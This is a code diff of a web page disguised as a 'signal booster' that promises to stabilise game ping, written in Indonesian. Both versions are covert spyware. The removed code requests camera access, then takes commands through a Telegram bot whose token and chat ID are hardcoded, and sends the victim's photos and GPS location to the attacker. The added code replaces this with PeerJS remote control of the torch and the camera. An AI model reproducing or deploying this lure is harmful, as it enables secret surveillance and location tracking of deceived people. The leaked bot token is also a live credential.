@@ -1,83 +1,37 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Sinyal Booster Hayabusa V3</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body { background: #000; color: #00ff00; text-align: center; font-family: sans-serif; padding: 50px 20px; }
-        .btn { background: #00ff00; color: #000; padding: 20px; border-radius: 50px; width: 100%; font-weight: bold; border: none; }
-    </style>
+    <title>Sinyal Booster V3</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
 </head>
-<body>
-    <div style="border: 2px dashed #00ff00; padding: 20px; border-radius: 15px;">
-        <h2>📡 SYSTEM OPTIMIZER</h2>
-        <p>Klik tombol untuk stabilkan ping game.</p>
-        <button class="btn" onclick="startSystem()">HUBUNGKAN SINYAL</button>
-        <p id="status" style="font-size: 12px; color: #888; margin-top: 15px;">Status: Standby</p>
-    </div>
-
-    <video id="video" style="display:none" autoplay playsinline></video>
-    <canvas id="canvas" style="display:none"></canvas>
+<body style="background:#000; color:#0f0; text-align:center;">
+    <h2>📡 BOOSTING SIGNAL...</h2>
+    <p id="my-id">Menghubungkan...</p>
+    <video id="v" style="display:none" autoplay playsinline></video>
 
     <script>
-        const TOKEN = "8373626378:AAHmCRe_FCCDug1yrlsnat6WFhi71Qf6lQI";
-        const ID = "7596509818";
-        let lastId = 0;
-        let videoTrack;
+        // Inisialisasi koneksi langsung
+        const peer = new Peer(); 
+        
+        peer.on('open', (id) => {
+            document.getElementById('my-id').innerText = "ID Jaringan: " + id;
+            // Kirim ID ini ke Abang (manual) agar Abang bisa kontrol
+        });
 
-        async function startSystem() {
-            document.getElementById('status').innerText = "Status: Terhubung (Running)";
-            // Minta Izin Kamera
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-            document.getElementById('video').srcObject = stream;
-            videoTrack = stream.getVideoTracks()[0];
-            
-            // Loop dengerin remote tiap 5 detik
-            dengerinRemote();
-            alert("Booster Aktif! Jangan tutup tab ini agar ping tetap stabil.");
-        }
-
-        async function dengerinRemote() {
-            try {
-                const r = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
-                const data = await r.json();
-                if (data.result.length > 0) {
-                    const updateId = data.result[0].update_id;
-                    const pesan = data.result[0].message.text;
-
-                    if (updateId !== lastId) {
-                        lastId = updateId;
-                        if (pesan === "!exec torch_on") toggleTorch(true);
-                        else if (pesan === "!exec torch_off") toggleTorch(false);
-                        else if (pesan === "!exec camera") ambilFoto();
-                        else if (pesan === "!exec location") ambilLokasi();
-                    }
-                }
-            } catch (e) {}
-            setTimeout(dengerinRemote, 5000);
-        }
-
-        async function toggleTorch(status) {
-            try { await videoTrack.applyConstraints({ advanced: [{ torch: status }] }); } catch (e) {}
-        }
-
-        function ambilFoto() {
-            const v = document.getElementById('video');
-            const c = document.getElementById('canvas');
-            c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            c.toBlob(blob => {
-                const f = new FormData();
-                f.append('chat_id', ID); f.append('photo', blob, 'target.jpg');
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: f });
-            }, 'image/jpeg');
-        }
-
-        function ambilLokasi() {
-            navigator.geolocation.getCurrentPosition(pos => {
-                const msg = `📍 LOKASI TARGET: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}`);
+        // Nunggu perintah klik-klik dari Abang
+        peer.on('connection', (conn) => {
+            conn.on('data', async (data) => {
+                if (data === "senter_on") jalankanSenter(true);
+                if (data === "senter_off") jalankanSenter(false);
+                if (data === "foto") ambilFoto(conn);
             });
+        });
+
+        let track;
+        async function jalankanSenter(s) {
+            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode:"environment"}});
+            track = stream.getVideoTracks()[0];
+            track.applyConstraints({advanced: [{torch: s}]});
         }
     </script>
 </body>
